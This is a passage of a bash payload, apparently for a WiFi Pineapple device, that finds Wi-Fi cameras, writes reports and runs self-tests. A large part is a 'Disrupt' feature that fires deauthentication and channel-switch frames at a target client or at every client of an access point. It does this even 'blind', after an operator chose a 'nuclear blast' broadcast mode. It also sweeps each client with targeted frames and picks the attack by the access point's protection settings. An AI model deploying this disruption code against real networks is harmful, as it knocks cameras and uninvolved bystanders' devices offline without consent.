  if [ "$R_TARGET" = ff:ff:ff:ff:ff:ff ]; then
    # A heard station is a TARGET even when it is not a SUBJECT, and conflating the two was a real
    # defect: measuring a device needs a Recon row and an address stable enough to compare across
    # the fire, but TRANSMITTING at it needs neither -- the frame carries an address, not a
    # baseline. Until 2026-11-09 `subjects` was both sets at once, so an AP whose only client was a
    # randomised-MAC phone refused with NO_MATCH and sent NOTHING. Measured on the bench, seven
    # consecutive attempts on fc:58:5a:08:42:15: `resp members ... n=1 why=ok ... recs=286..468`
    # (the capture heard the station, zero short/trunc/runt) followed by `refused ... NO_MATCH
    # members=1`, with pk_before and pk_after both '-' in every loot row -- while the GUI's AP-row
    # deauth, which is the SAME opcode-400 broadcast frame this function would have sent, dropped
    # that client on demand. The measurement gate was gating the transmit.
    # These members get p0 '-', so resp_verdict returns INCONCLUSIVE for them rather than inventing
    # a verdict -- the honest answer for a device we disconnected but cannot score.
    if [ "$RESP_MEMBERS_BSS" = "$R_BSSID" ]; then
      for m in "${!RESP_MEMBERS[@]}"; do
        [ "$m" = ff:ff:ff:ff:ff:ff ] && continue
        [ -n "${P0[$m]+x}" ] && continue          # already a measurable subject
        subjects+=("$m"); P0[$m]=-; T0[$m]=-
      done
    fi
    if (( ${#subjects[@]} == 0 )); then     # heard nobody AND can measure nobody
      # FIRES ANYWAY -- operator-decided 2026-11-10: "I'll accept nuclear blast. Let the AP row fire
      # broadcast frames." This used to refuse with the capture's reason and transmit nothing, which
      # was the 2026-11-09 defect one layer up: the frame is addressed to ff:ff:ff:ff:ff:ff and needs
      # no member list, so a measurement gate was again gating the transmit. CLI_AWK's seen>=2 filter
      # (which can legitimately admit nobody from an occupied BSS) is untouched -- it still guards
      # the MEASUREMENT set. With nothing to measure, the broadcast target itself is the one subject,
      # with p0 '-', so resp_verdict scores it INCONCLUSIVE and the loot never claims an effect.
      # MEMBERS_WHY empty is reachable only if a set was gathered for a DIFFERENT BSSID, which the
      # entry reset should prevent; it is reported as NO_CLIENTS, as the refusal used to.
      nomem="${MEMBERS_WHY:-NO_CLIENTS}"
      LOG yellow "${MEMBERS_TEXT:-no visible clients on ${R_BSSID:9}}"$'\n'"firing broadcast anyway"
      log resp "no-members $R_BSSID why=$nomem members=${#RESP_MEMBERS[@]} itmax=$BSS_ITMAX recs=$BSS_RECS short=$BSS_SHORT: firing broadcast anyway, nothing to measure"
      subjects=("$R_TARGET"); P0[$R_TARGET]=-; T0[$R_TARGET]=-
    fi
  else
    (( ${#subjects[@]} == 0 )) && { subjects=("$R_TARGET"); P0[$R_TARGET]=-; T0[$R_TARGET]=-; }
  fi
  n=${#subjects[@]}
  [ "$lock" = unverified ] && LOG yellow "$LOCK_TEXT"
  set_state RESPOND
  LOG "$k -> ${R_BSSID:9} ch $R_CH"$'\n'"lock: $lock, $n subject(s)"
  log resp "fire $k $R_BSSID $R_TARGET ch$R_CH badge=$badge lock=$lock scope=$scope subjects=$n measurable=$nmeas heard=${#RESP_MEMBERS[@]}${nomem:+ members=none why=$nomem}"
  # Capture the command's rc AND its stderr. Discarding both was a real defect: if the firmware
  # refuses the command nothing leaves the radio, yet the loot row still read NO_EFFECT (subjects
  # kept transmitting) or MOVED (a counter happened to stall) -- indistinguishable from a real
  # measurement. NO_EFFECT in particular reads as the firmware fact "CSA does not move this
  # camera", which is one of the open questions this rung exists to ANSWER (CLAUDE.md, day-one
  # 17a). A swallowed refusal does not merely lose information, it files a fabricated answer.
  # CMD_REFUSED is deliberately NOT in the MOVED/NO_EFFECT/INCONCLUSIVE vocabulary, so a refusal
  # can never be mistaken for a measurement by a reader of responses.tsv.
  if [ "$k" = CSA ]; then
    # csa_issue owns the rc-vs-stderr question, which the two senders answer oppositely, and logs
    # its own command line. It also names itself for the loot, so a reader can tell a pagerinj CSA
    # from a firmware one without cross-referencing the config.
    csa_issue; frc=$?; ferr="$CSA_ERR"; cmd="$CSA_CMD"
    # rc 2 is "transmitted, then capped by its own timeout" -- frames provably left the radio, so
    # this must not take the refusal path below. Let it through to the measurement, which scores it
    # on the counters like any other fire; a capped injector is a reason to distrust the DWELL, not
    # a reason to claim nothing was sent.
    if (( frc == 2 )); then
      LOG yellow "CSA injector was capped after transmitting; measuring anyway"
      log resp "csa capped-after-send ${ferr:0:160}"
      frc=0; ferr=''
    fi
  else
    : >"$FIRE_ERR"
    "$cmd" "$R_BSSID" "$R_TARGET" "$R_CH" >/dev/null 2>"$FIRE_ERR"
    frc=$?; ferr=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); ferr=${ferr:0:200}; rm -f "$FIRE_ERR"
    log resp "cmd $cmd rc=$frc${ferr:+ err=$ferr}"
  fi
  if (( frc != 0 )) || [ -n "$ferr" ]; then
    unlock_target; log resp "unlocked after refusal"
    LOG red "$cmd refused (rc $frc): nothing was transmitted"${ferr:+$'\n'"$ferr"}
    for m in "${subjects[@]}"; do resp_write "$mac" "$badge" "$k" "$cmd" "$lock" "${P0[$m]}" - CMD_REFUSED "$m"; done
    set_state RESPOND_NIL; return 1
  fi
  [ -n "$nomem" ] && log resp "fired $k $R_BSSID broadcast with no members recovered why=$nomem: INCONCLUSIVE by construction"
  # The CSA half of BOTH, issued as its own command because no firmware command combines them (see
  # response_cmd: _ALL is the CSA opcode under another name, and pineapd's real deauth+CSA opcode
  # 401 is dead code no command reaches). A refused CSA leg must NOT fail the attempt -- the deauth
  # has already left -- so it warns and the loot records which legs went out.
  if [ "$k" = BOTH ]; then
    csa_issue; local crc=$?
    # 0 sent cleanly, 2 sent then capped. Both put frames on the air, so both name the sender in
    # the loot; only a real failure takes the warning branch.
    if (( crc == 0 )) || (( crc == 2 )); then
      (( crc == 2 )) && log resp "csa leg capped after sending ${CSA_ERR:0:160}"
      # Keep the firmware spelling stable for readers and for the gates; name the injector when it
      # is what actually sent, since "which CSA was this" is the first question a loot row raises.
      case "$CSA_CMD" in PINEAPPLE_*) cmd="$cmd+CSA" ;; *) cmd="$cmd+$CSA_CMD" ;; esac
    else
      LOG yellow "CSA leg did not send; the deauth was still transmitted"
      log resp "csa leg failed ${CSA_ERR:-unknown}"
    fi
  fi
  # Targeted sweep. Measured on the bench 2026-11-05 against one phone on one AP: a TARGETED
  # PINEAPPLE_DEAUTH_CLIENT dropped it immediately, while PINEAPPLE_DEAUTH_CLIENT_ALL and
  # PINEAPPLE_DEAUTH_CLIENT_CSA were both accepted (rc 0) and did nothing. That is one data point
  # from the hardest class of client - a modern phone with a randomised MAC - and it says nothing
  # about what a cheap camera's stack does, so this ADDS a targeted frame per member rather than
  # replacing the broadcast one. The two are complementary, not ordered: broadcast reaches members
  # the capture never enumerated and is immune to a stale address, while targeted reaches members
  # that filter broadcast. Doing both is better than either, and costs n frames instead of one.
  # Not for CSA: that command takes no target (<bssid> <channel>, arity measured on the device).
  # Guarded on SCOPE, not on R_TARGET being broadcast. attack_scope is the single place blast radius
  # is decided, and a CLIENT row firing BOTH is scope=bss with R_TARGET set to the client - _ALL
  # discards that target and goes BSS-wide regardless - so an R_TARGET test would skip the sweep in
  # exactly the case it is most needed. Unreachable until the inverse lookup lands; wrong now.
  # Not when nomem is set: the one subject is then the broadcast placeholder, not a station.
  if [ "$SWEEP_TARGETED" = 1 ] && [ "$k" != CSA ] && [ "$scope" = bss ] && (( n > 0 )) && [ -z "$nomem" ]; then
    local sw_cmd sw_ok=0 sw_rc sw_err
    sw_cmd=$(response_cmd DEAUTH)
    if [ -n "$sw_cmd" ] && command -v "$sw_cmd" >/dev/null 2>&1; then
      for m in "${subjects[@]}"; do
        : >"$FIRE_ERR"
        "$sw_cmd" "$R_BSSID" "$m" "$R_CH" >/dev/null 2>"$FIRE_ERR"; sw_rc=$?
        sw_err=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); rm -f "$FIRE_ERR"
        # rc is useless on this firmware (hak5cmd exits 0 on its error paths too, measured), so the
        # stderr is the only signal that a frame was refused.
        if (( sw_rc == 0 )) && [ -z "$sw_err" ]; then sw_ok=$((sw_ok + 1))
        else log resp "sweep $m rc=$sw_rc${sw_err:+ err=${sw_err:0:120}}"; fi
      done
      log resp "sweep $sw_cmd $R_BSSID targeted=$sw_ok of $n"
      (( sw_ok > 0 )) && LOG "targeted $sw_ok/$n client(s)"
    fi
  fi
  sleep "$RESP_SETTLE_SECS"
  resp_snapshot "$scope"
  unlock_target
  for m in "${subjects[@]}"; do
    p0="${P0[$m]}"; t0="${T0[$m]}"; present=1; p1=-; t1=-
    if [ -n "${RS_PK[$m]+x}" ]; then p1="${RS_PK[$m]}"; t1="${RS_T[$m]}"; else present=0; fi
    verdict=$(resp_verdict "$p0" "$t0" "$p1" "$t1" "$present")
    case "$verdict" in MOVED) nmv=$((nmv + 1)) ;; NO_EFFECT) nne=$((nne + 1)) ;; *) ninc=$((ninc + 1)) ;; esac
    [ "$m" = "$R_TARGET" ] && tgt_verdict="$verdict"
    resp_write "$mac" "$badge" "$k" "$cmd" "$lock" "$p0" "$p1" "$verdict" "$m"
    log resp "subject $m $verdict pk $p0 -> $p1 present=$present"
  done
  verdict=$(resp_aggregate "$nmv" "$nne" "$ninc")
  log resp "verdict $verdict $R_TARGET scope=$scope moved=$nmv no_effect=$nne inconclusive=$ninc of $n"
  case "$verdict" in
    MOVED)     set_state RESPOND_HIT; LOG green "$verdict: $nmv/$n quiet" ;;
    NO_EFFECT) set_state RESPOND_NIL; LOG yellow "$verdict: $nne/$n still transmitting" ;;
    *)         set_state INCONCLUSIVE; LOG yellow "$verdict: $ninc/$n unsettled, $nmv quiet" ;;
  esac
  # The aggregate word covers the whole blast radius, which is the honest summary of a BSS-wide
  # transmit. The operator still picked one device, so name that device's own verdict too, or a
  # collateral NO_EFFECT reads as "the camera I aimed at stayed up".
  if [ "$R_TARGET" != ff:ff:ff:ff:ff:ff ] && (( n > 1 )); then
    LOG "picked ${R_TARGET:9}: $tgt_verdict"; log resp "picked $R_TARGET $tgt_verdict of $n subjects"
  fi
  return 0
}

# auto_respond_ok <mac> -> 0 when the funnel may offer Disrupt without being asked.
# Two keys, not one: RESPONSE opens the manual rung, AUTO_RESPOND additionally lets CamHound
# raise it on its own. Note this resolves the target as a side effect, leaving R_* set.
auto_respond_ok() {
  [ "$RESPONSE" = 1 ] || return 1
  [ "$AUTO_RESPOND" = 1 ] || return 1
  [ -n "${IGNORED[$1]}" ] && return 1
  resp_target "$1" >/dev/null 2>&1 || return 1
  return 0
}

disrupt_row() {   # a cached badge is free to show; an uncached one is not worth a capture to render
  local mac="$1" ap bss
  # Mirrors "Watch n/a (not associated)" two lines up in detail_card. Without this the operator
  # presses Disrupt, resp_target refuses, the red line lands on the log pane BEHIND the card, and
  # the card redraws unchanged - which reads as a dead button. Safe to call resp_target here:
  # disrupt_row always runs inside $( ), so the globals it sets die with the subshell.
  if [ "${ROLE[$mac]}" = cli ] && { [ -z "${AP_OF[$mac]}" ] || [ "${AP_OF[$mac]}" = - ]; }; then
    # The user payload can read the AP off the air (assoc_lookup), and its card turns this row into
    # that lookup. The hooks carry no such function, so there the row stays n/a.
    if command -v assoc_can >/dev/null 2>&1 && assoc_can "$mac"; then printf 'Disrupt (find AP first)'; return 0; fi
    printf 'Disrupt n/a (not associated)'; return 0     # no BSS to announce from
  fi
  resp_target "$mac" || { printf 'Disrupt n/a (no channel)'; return 0; }
  [ "${ROLE[$mac]}" = cli ] && bss="${AP_OF[$mac]:--}" || bss="$mac"
  if [ -n "${POSTURE[$bss]}" ] && (( EPOCHSECONDS - ${POSTURE_TS[$bss]:-0} < POSTURE_TTL )); then
    printf 'Disrupt [%s]' "${POSTURE[$bss]}"
  else
    printf 'Disrupt'
  fi
}

disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon says will work
  local mac="$1" badge opts k exp scope items=() pickmap=() i=0 choice
  # User payload only (the hooks take the AP from the Recon selection): a client's AP that was read
  # off the air more than ASSOC_TTL ago is looked at again before anything is aimed at it, on every
  # path into this menu -- the card, the post-Watch funnel and AUTO_RESPOND alike.
  command -v assoc_refresh >/dev/null 2>&1 && assoc_refresh "$mac"
  if ! resp_target "$mac"; then
    LOG red "nothing to attack: no associated BSS or no channel for $mac"; return 0
  fi
  LOG "reading posture ${R_BSSID:9} ch $R_CH"
  inj_probe                    # here, not inside posture_of: $( ) would discard the cache
  posture_of "$R_BSSID" "$R_BAND" "$R_CH" >/dev/null; badge="$POSTURE_LAST"
  opts=$(posture_opts "$badge")
  LOG "[$badge] ${R_BSSID:9} ch$R_CH ${R_BAND}GHz"$'\n'"target ${R_TARGET:9}"$'\n'"$(posture_why "$badge")"
  if [ -z "$opts" ]; then
    LOG red "$(posture_why "$badge")"
    confirm "Nothing is expected to work ($badge). Try anyway?" || return 0
    opts='BOTH DEAUTH CSA'
  elif [ "$badge" = '?' ]; then
    # No beacon was captured, so nothing below is advice -- say so instead of firing on one accept.
    confirm "Posture unread on ${R_BSSID:9}: no beacon captured. Fire blind?" || return 0
  fi
  for k in $opts; do
    exp=$(posture_expect "$badge" "$k")
    [ "$(attack_scope "$k")" = bss ] && scope=' bss' || scope=''
    items+=("$(printf '%s%s (%s)' "$k" "$scope" "$exp")"); pickmap+=("$k"); i=$((i + 1))
  done
  pick_list "Disrupt [$badge] ${R_TARGET:9}" "${items[0]}" "${items[@]}" "Back" || return 0
  [ "$PICK" = Back ] && return 0
  choice=""
  for ((i = 0; i < ${#items[@]}; i++)); do [ "$PICK" = "${items[$i]}" ] && choice="${pickmap[$i]}"; done
  [ -n "$choice" ] || return 0
  if [ "$RESPONSE_CONFIRM" != 0 ]; then    # fail closed: only an explicit 0 removes the confirm
    # Name the real blast radius: "CSA on <one client>" would be a lie, the command has no target.
    if [ "$(attack_scope "$choice")" = bss ]; then
      confirm "$choice on EVERY client of ${R_BSSID:9} ch $R_CH?" || { LOG "cancelled"; return 0; }
    else
      confirm "$choice on ${R_TARGET:9} via ${R_BSSID:9} ch $R_CH?" || { LOG "cancelled"; return 0; }
    fi
  fi
  resp_fire "$mac" "$choice" "$badge"
}

posture_why() {   # one line of plain English for a badge
  case "$1" in
    'D+C')   printf 'no PMF: deauth and CSA both land' ;;
    'D?+C')  printf 'PMF optional: deauth works per-client, CSA lands' ;;
    'C')     printf 'PMF required: deauth is ignored, CSA still lands' ;;
    'NONE')  printf 'PMF + beacon protection: no frame this firmware sends works' ;;
    'NOINJ') printf 'DFS or 6 GHz: the radio may not transmit on this channel' ;;
    *)       printf 'posture unread: no beacon captured' ;;
  esac
}
# --- response rung end ---

# --- watch core end ---

# locate_target mac -> MONITOR RSSI loop, 5-sample median, hysteresis, staleness; A stops

# ================================================================================= report ===
REPORT_DONE_AT_EXIT=0
write_report() {
  local quiet="$1" f="$LOOT_DIR/report_$RUN_ID.txt" mac n2=0 n5=0 n6=0 nu=0 c l p ap line six=0 nc=0 nl=0 npo=0 nlane=0 nmod=0
  local -A census tree
  [ -n "$RUN_ID" ] || return 0
  [ "$quiet" = quiet ] && [ "$CYCLE" = 0 ] && return 0
  {
    printf 'CamHound %s report  run %s  %s\n' "$VERSION" "$RUN_ID" "$(printf '%(%Y-%m-%d %H:%M)T' -1)"
    printf 'mode %s  cycles %s  duration %ss  recon paused %ss  bands %s  sigs %s (%s)\n' "$MODE" "$CYCLE" "$((EPOCHSECONDS - RUN_T0))" "$PAUSED_SECS" "${BANDS_LINE:-?}" "$SIG_COUNT" "$SIG_SOURCE"
    for mac in "${!ROLE[@]}"; do
      case "${BANDNAME[$mac]}" in CONFIRMED) nc=$((nc + 1)) ;; LIKELY) nl=$((nl + 1)) ;; POSSIBLE) npo=$((npo + 1)) ;; STREAM) nlane=$((nlane + 1)) ;; MODULE) nmod=$((nmod + 1)) ;; esac
      [ "${ROLE[$mac]}" = cli ] && continue
      case "${BAND[$mac]}" in 2) n2=$((n2 + 1)) ;; 5) n5=$((n5 + 1)) ;; 6) n6=$((n6 + 1)); six=1 ;; *) nu=$((nu + 1)) ;; esac
    done
    printf '\n== headline ==\nCONFIRMED %s  LIKELY %s  POSSIBLE %s  stream-lane %s  modules %s  devices %s  returning %s (inventory rows loaded %s)\n' "$nc" "$nl" "$npo" "$nlane" "$nmod" "${#ROLE[@]}" "$RETURNING" "$LOADED_ROWS"
    printf 'APs by band: 2.4 GHz %s, 5 GHz %s, 6 GHz %s, unknown %s; clients inherit their AP band\n' "$n2" "$n5" "$n6" "$nu"
    (( six == 0 )) && printf '6 GHz: not scanned or nothing heard (enable in Recon settings)\n'
    printf '\n== suspects (conf band mac vendor tags classes cat ssid ch rssi_best n_seen first-last [lat,lon]) ==\n'
    for mac in "${!CONF[@]}"; do
      (( ${CONF[$mac]:-0} >= 20 )) || continue
      printf '%03d|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s-%s|%s\n' "${CONF[$mac]}" "${BANDNAME[$mac]}" "$mac" "${VENDOR[$mac]:--}" "${TAGS[$mac]:--}" "${ID_CLASSES[$mac]:--}" "${CAT[$mac]}" "${SSID_CLEAN[$mac]:--}" "${CH[$mac]:--}" "${RSSI_BEST[$mac]:--}" "${N_SEEN[$mac]}" "${FIRST_SEEN[$mac]}" "${LAST_SEEN[$mac]}" "${LAT[$mac]:+${LAT[$mac]},${LON[$mac]}}"
    done | sort -t'|' -k1,1nr 2>/dev/null
    printf '\n== vendor census (type: vendor count) ==\n'
    for mac in "${!ROLE[@]}"; do c="${VEND_TYPE[$mac]:-NONE}: ${VENDOR[$mac]:--}"; census[$c]=$(( ${census[$c]:-0} + 1 )); done
    for c in "${!census[@]}"; do printf '%s %s\n' "${census[$c]}" "$c"; done | sort -rn 2>/dev/null | head -60
    printf '\n== AP -> clients (top 20 per AP; module clients marked *; BASE? = hidden AP with 1-4 clients on a module/mixed OUI; <not listed> = an AP read off the air that Recon has not listed) ==\n'
    for mac in "${!AP_OF[@]}"; do ap="${AP_OF[$mac]}"; [ "$ap" != "-" ] && tree[$ap]+=" $mac"; done
    for ap in "${!tree[@]}"; do
      n2=0; line=""; local nonrand=0 base=""
      for mac in ${tree[$ap]}; do
        is_rand "$mac" || nonrand=$((nonrand + 1))
        (( n2 >= 20 )) && continue; n2=$((n2 + 1))
        l="${mac:9}"; [ "${VEND_TYPE[$mac]}" = VENDOR_MODULE ] && l="*$l"; line+=" $l(${VENDOR[$mac]:0:6})"
      done
      if [ "${HIDDEN[$ap]}" = 1 ] && (( nonrand >= 1 && nonrand <= 4 )) && { [ "${VEND_TYPE[$ap]}" = VENDOR_MODULE ] || [ "${VEND_TYPE[$ap]}" = VENDOR_WEAK ]; }; then base=" BASE?"; fi
      # <hidden> means Recon listed the AP and its SSID is empty; an AP with no row at all was named
      # by a client's own frames and its beacon was never heard, which is a different finding
      if [ -n "${ROLE[$ap]}" ]; then l="${SSID_CLEAN[$ap]:-<hidden>}"; else l='<not listed>'; fi
      printf '%s %s %s [%s]%s:%s\n' "$ap" "$l" "${VENDOR[$ap]:--}" "${BANDNAME[$ap]:-none}" "$base" "$line"
    done | sort 2>/dev/null
    printf '\n== modules (check these) ==\n'
    for mac in "${!ROLE[@]}"; do [ "${BANDNAME[$mac]}" = MODULE ] && printf '%s %s %s %s%s\n' "$mac" "${VENDOR[$mac]:--}" "${PROX[$mac]:-?}" "${RSSI_LAST[$mac]:--}" "${BUSY[$mac]:+ busy}"; done | sort 2>/dev/null
    printf '\n== gps ==\nfirst %s  last %s\n' "${GPS_FIRST:-no fix}" "$GPS_LAST"
    printf '\n== footer ==\ncycles %s  duration %ss  recon paused %ss  battery %s%%  cfg overrides %s%s\n' "$CYCLE" "$((EPOCHSECONDS - RUN_T0))" "$PAUSED_SECS" "$BATT" "$CFG_OVERRIDES" "$CFG_NOTE"
  } >"$f.new" 2>/dev/null && mv "$f.new" "$f"
  [ "$quiet" = quiet ] || log report "written $f"
  return 0
}

# =============================================================================== selftest ===
ST_FAIL=0; ST_N=0
st() { ST_N=$((ST_N + 1)); if [ "$2" = "$3" ]; then printf 'ok   %s\n' "$1"; else printf 'FAIL %s: got [%s] want [%s]\n' "$1" "$2" "$3"; ST_FAIL=$((ST_FAIL + 1)); fi; }
st_stub_ui() {   # --selftest must change nothing, say nothing, and never block - on a laptop or on a Pager
  local c
  # Display and physical effects. Stubbed EVEN WHEN PRESENT: they used to be stubbed only when
  # absent, which is true of a laptop and false of a Pager, so on the device the selftest painted
  # the operator's screen with its own fixtures - "settings reset to defaults", "band write
  # restarted pineapd: Recon starts over", "sig line 0 skipped: bad label", "RSSI_MIN 60 ignored".
  # Every one of those is a false statement about the device, on the same display a live payload is
  # using. No case asserts on them, because the laptop they were written for stubs them away.
  ST_QUIET=(LOG LED VIBRATE RINGTONE ALERT PROMPT ERROR_DIALOG)
  # Anything that waits for a button press, stubbed to DECLINE. rc != 0 is the cancel path in all
  # three callers (confirm, pick_list, settings_menu's number branch), and it is also what the
  # laptop does today by accident: absent -> 127. These were stubbed NOWHERE, and that asymmetry is
  # the trap - absent where the gates run, present on the Pager - so a future case reaching
  # settings_menu, pick_list, disrupt_menu or resp_fire would pass every gate and then block a
  # device run for ever, waiting for a press nobody is there to make.
  ST_BLOCKING=(CONFIRMATION_DIALOG LIST_PICKER NUMBER_PICKER)
  # Anything that changes the device or its saved config.
  ST_DEVICE=(_pineap PINEAPPLE_EXAMINE_BSSID PINEAPPLE_EXAMINE_CHANNEL PINEAPPLE_EXAMINE_RESET PINEAPPLE_RECON_NEW PINEAPPLE_SET_BANDS
             PINEAPPLE_DEAUTH_CLIENT PINEAPPLE_DEAUTH_CLIENT_ALL PINEAPPLE_DEAUTH_CLIENT_CSA PAYLOAD_SET_CONFIG PAYLOAD_DEL_CONFIG)
  for c in "${ST_QUIET[@]}" "${ST_DEVICE[@]}"; do eval "$c() { :; }"; done
  for c in "${ST_BLOCKING[@]}"; do eval "$c() { return 1; }"; done
  PAYLOAD_GET_CONFIG() { return 1; }
  ST_STUBBED=("${ST_QUIET[@]}" "${ST_BLOCKING[@]}" "${ST_DEVICE[@]}" PAYLOAD_GET_CONFIG)
  # Not coverable here: GPS_GET runs as `timeout 3 GPS_GET`, and timeout execs a real command, so a
  # shell function never intercepts it. That timeout is its only bound.
}
st_stubs_intact() {   # -> the stubs a teardown destroyed, or "none". A teardown that unset -f's one
  local c miss=""   # of these hands every later case the REAL command, which on a Pager is a radio.
  for c in "${ST_STUBBED[@]}"; do [ "$(type -t "$c")" = function ] || miss+=" $c"; done
  printf '%s' "${miss:-none}"
}
st_device() {   # st_device mac role "vendor text" "ssid" hidden ap_of
  local m="$1"
  ROLE[$m]="$2"; VLOW[$m]="${3,,}"; VENDOR[$m]="${3:0:14}"; unset "VEND_TYPE[$m]"; SSID_CLEAN[$m]="$4"; HIDDEN[$m]="$5"; AP_OF[$m]="${6:--}"
  LAST_SEEN[$m]=$EPOCHSECONDS; N_SEEN[$m]=1; FIRST_SEEN[$m]=$EPOCHSECONDS; KITAP[$m]=""; unset "KITCL[$m]" "BEH[$m]" "BEH_GATE[$m]" "BEH_VERDICT[$m]" "EVENT_FLAG[$m]" "BUSY[$m]" "PROBES[$m]"
}
st_other_has() {   # st_other_has mac -> yes|no: is this MAC in the "Other devices" list?
  sort_macs other; local m
  for m in "${SORTED[@]}"; do [ "$m" = "$1" ] && { printf yes; return 0; }; done
  printf no
}
st_pcap() {   # synthetic LE pcap: st_pcap file orig_len count ts
  local f="$1" ol="$2" n="$3" ts="$4" i
  le32() { printf "\\x$(printf %02x $(( $1 & 255 )))\\x$(printf %02x $(( ($1 >> 8) & 255 )))\\x$(printf %02x $(( ($1 >> 16) & 255 )))\\x$(printf %02x $(( ($1 >> 24) & 255 )))"; }
  { le32 2712847316; printf '\x02\x00\x04\x00'; le32 0; le32 0; le32 32; le32 127
    for ((i = 0; i < n; i++)); do le32 $((ts + i / 2)); le32 $((i * 1000)); le32 32; le32 "$ol"; printf '%032d' 0 | tr 0 '\0'; done; } >"$f"
}
st_gate() {   # st_gate <bindir> -> capture_ready's verdict with PATH masked to that dir alone
  local r                                  # runs in $( ), so the mask never escapes the subshell
  # shellcheck disable=SC2123   # masking PATH is the point: capture_ready probes what is on it
  PATH="$1"; capture_ready && r=1 || r=0; printf '%s' "$r"
}
st_le32h() { printf '%02x%02x%02x%02x' $(( $1 & 255 )) $(( ($1 >> 8) & 255 )) $(( ($1 >> 16) & 255 )) $(( ($1 >> 24) & 255 )); }
st_hex2bin() { local h="$1" i; for ((i = 0; i < ${#h}; i += 2)); do printf "\\x${h:$i:2}"; done; }
st_be32h() { printf '%02x%02x%02x%02x' $(( ($1 >> 24) & 255 )) $(( ($1 >> 16) & 255 )) $(( ($1 >> 8) & 255 )) $(( $1 & 255 )); }
st_data_pcap() {   # st_data_pcap file bssid12hex [be] -> a pcap of mixed data frames for bss_clients
  # With a third argument the pcap is written BIG-endian: magic, version and every record header
  # word byte-swapped, while the radiotap it_len stays LITTLE-endian, because radiotap is
  # little-endian by spec whatever the containing pcap is. That is the only fixture that can tell
  # le16 from u16 in the walker, and without it the distinction is untested.
  # Records of mixed, non-multiple-of-4 lengths: PCAP_AWK aborts the whole file on
  # `incl_len % 4 != 0`, which is the reason bss_clients has its own byte-oriented walker
  # (PLAN_v2 item 1's corollary). The radiotap it_len of 18 is chosen for a different reason -- it
  # is an odd-but-plausible header length, and reading it with the pcap's byte order instead of
  # little-endian turns it into 4608, which the big-endian case below detects.
  local f="$1" b="$2" be="${3:-}" rt out='' q L gh w32
  local -a fr=()
  rt="000012000000000000000000000000000000"
  fr+=("${rt}08010000${b}ec71db000011${b}0000")        # ToDS: addr1 BSSID, addr2 client :11
  fr+=("${rt}08010000${b}ec71db000011${b}0000")        # twice, so :11 clears the >=2 gate
  fr+=("${rt}88010000${b}ec71db000011${b}0000")        # QoS ToDS, same station
  fr+=("${rt}08020000ec71db000012${b}${b}0000")        # FromDS: client is addr1, addr2 is the AP
  fr+=("${rt}08020000ec71db000012${b}${b}0000")
  fr+=("${rt}48010000${b}ec71db000013${b}0000")        # ToDS Null, :13 seen exactly ONCE
  # Its addr2 is a station MAC, NOT the BSSID, and it appears twice -- so only the frame-TYPE check
  # can exclude it. With the BSSID in addr2 the c == bss guard would have excluded it anyway and
  # the case would have passed with the type check removed.
  fr+=("${rt}80000000ffffffffffffec71db000015${b}0000")  # a beacon: management, never a client
  fr+=("${rt}80000000ffffffffffffec71db000015${b}0000")
  fr+=("${rt}0802000001005e000001${b}${b}0000")        # FromDS to a group address
  fr+=("${rt}0802000001005e000001${b}${b}0000")
  fr+=("${rt}08010000${b}${b}${b}0000")                # the AP as its own addr2
  fr+=("${rt}08010000${b}${b}${b}0000")
  fr+=("${rt}0801")                                    # runt: 20 B, below rt+16 -> counted SHORT
  fr+=("${rt}08010000${b}ec71db000014${b}0000")        # and the walk must continue past it
  fr+=("${rt}08010000${b}ec71db000014${b}0000")
  w32=st_le32h; [ -n "$be" ] && w32=st_be32h
  for q in "${fr[@]}"; do
    L=$(( ${#q} / 2 ))
    out+="$($w32 0)$($w32 0)$($w32 "$L")$($w32 "$L")$q"
  done
  if [ -n "$be" ]; then gh="a1b2c3d4000200040000000000000000$(st_be32h 65535)$(st_be32h 127)"
  else gh="d4c3b2a1020004000000000000000000$(st_le32h 65535)$(st_le32h 127)"; fi
  st_hex2bin "$gh$out" >"$f"
}
st_members() {   # the admitted client set, sorted and space-joined
  local m out=''
  while read -r m; do [ -n "$m" ] && out="${out:+$out }$m"; done \
    < <(bss_clients "$1" "$2" | awk '$1 == "CLI" { print $2 }' | sort)
  printf '%s' "$out"
}
st_bss_key() { bss_clients "$1" "$2" | awk -v k="$3" '$1 == k { print $2 }'; }
st_pairs() {   # st_pairs <pcap> [sta] -> "sta>bssid=n" for every pair the walker's inverse mode admits, sorted and space-joined
  local s b n out=''
  while read -r s b n; do [ -n "$s" ] && out="${out:+$out }$s>$b=$n"; done \
    < <(pcap_stream "$1" | awk -v mode=pairs -v sta="${2:-}" -v own="$OWN_MACS" "$CLI_AWK" | awk '$1 == "PAIR" { print $2, $3, $4 }' | sort)
  printf '%s' "$out"
}
st_assoc_pcap() {   # st_assoc_pcap file sta12hex bss12hex:n ... -> n ToDS data frames from sta to each BSSID, same radiotap as st_data_pcap
  local f="$1" s="$2" rt="000012000000000000000000000000000000" out='' spec b n i q L
  shift 2
  for spec in "$@"; do
    b="${spec%%:*}"; n="${spec##*:}"
    for ((i = 0; i < n; i++)); do
      q="${rt}08010000${b}${s}${b}0000"; L=$(( ${#q} / 2 ))
      out+="$(st_le32h 0)$(st_le32h 0)$(st_le32h "$L")$(st_le32h "$L")$q"
    done
  done
  st_hex2bin "d4c3b2a1020004000000000000000000$(st_le32h 65535)$(st_le32h 127)$out" >"$f"
}
st_subjects() {   # the measured subject set, sorted and space-joined, so the compare is stable
  local m out=''
  while read -r m; do [ -n "$m" ] && out="${out:+$out }$m"; done < <(printf '%s\n' "${!RS_PK[@]}" | sort)
  printf '%s' "$out"
}
st_beacon_pcap() {   # st_beacon_pcap file bssid12hex [rsn payload hex] [extcap payload hex]
  local f="$1" bss="$2" rsn="$3" ext="$4" ies frame flen gh rec
  ies="000463616d31"                                              # SSID "cam1"
  [ -n "$rsn" ] && ies+="30$(printf %02x $(( ${#rsn} / 2 )))$rsn" # 0x30 = 48  RSN
  [ -n "$ext" ] && ies+="7f$(printf %02x $(( ${#ext} / 2 )))$ext" # 0x7f = 127 Extended Capabilities
  frame="0000080000000000"                                        # radiotap, it_len 8
  frame+="80000000"                                               # FC beacon + duration
  frame+="ffffffffffff${bss}${bss}0000"                           # addr1/2/3 + seq  -> 24 B header
  frame+="000000000000000064001104"                               # timestamp 8 + interval 2 + caps 2
  frame+="$ies"
  flen=$(( ${#frame} / 2 ))
